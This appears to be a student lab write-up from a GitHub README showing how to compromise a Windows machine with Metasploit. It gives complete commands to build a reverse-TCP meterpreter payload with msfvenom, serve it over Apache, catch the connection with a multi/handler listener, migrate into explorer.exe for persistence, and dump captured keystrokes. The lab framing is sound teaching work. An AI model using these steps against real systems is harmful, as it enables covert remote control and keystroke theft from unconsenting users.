Compromising windows using Metasploit
Metasploit

Compromising windows using Metasploit
AIM:

To Compromise windows using Metasploit .
DESIGN STEPS:
Step 1:

Install kali linux either in partition or virtual box or in live mode
Step 2:

Investigate on the various categories of tools as follows:
Step 3:

Open terminal and try execute some kali linux commands
OUTPUT:

![280442420-54fd799e-0076-4a17-bf93-6dbc1aa42616](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/9fc9fe94-c417-44b6-a0fb-9f4c90fed9ce)


Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![280442460-04ceff39-1fbe-4361-bca3-b851daad372f](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/5caed90d-eeaa-416d-8e6a-819f5c5bf90e)


copy the fun.exe into the apache /var/www/html folder ![280442496-ac2a0aa4-7bde-4410-a933-304df04ce31f](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/6b0acb22-92ad-40e0-beaa-8defd3a027c1)


Start apache server sudo systemctl apache2 start ![280442530-540832c2-a032-4a9a-848b-e14f860b2bd5](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/2fb50559-5938-49b4-b6be-9757cdb0a7ef)


Check the status of apache2 ![280442562-a57a2348-c4de-4fb2-a465-904b37cfb9b0](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/67a253d4-d257-4e81-8a28-499b5c0ce1ab)


Invoke msfconsole:
OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit ![280442630-9aa19a10-610e-4743-83cd-f59011002911](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/35759e69-33d1-45be-a5c2-34598853cf5d)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. ![280442661-7ee54804-21c1-4c37-9aea-468f1c00dda1](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/475c09b3-75d2-4a11-a00f-3720c954e288)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit image ![280442689-410a522c-76c1-4167-be8e-802769ae87f8](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/58117e5f-64c9-435f-af76-7e45cf3be7f7)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 ![280442732-0f965d4a-97b7-4797-9966-75188d713fc3](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/48b464f9-f146-41cc-aaed-534e02df701e)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted ![280442797-84ffdbba-6b4f-446e-8185-af7fef514caa](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/4f97250f-58f3-4d68-8123-b2bf58c57649)


keyscan_dump Shows the keystrokes captured so far ![280442832-f5f4a0a2-39cf-4592-9459-4840c30e9745](https://github.com/Bakkiyalakshmi29/Compromising-windows-using-Metasploit/assets/119406233/86d24b54-f783-482c-9f31-aa0fdc2172f9)

RESULT:

The Metasploit framework is used to compromise windows and is examined successfully.
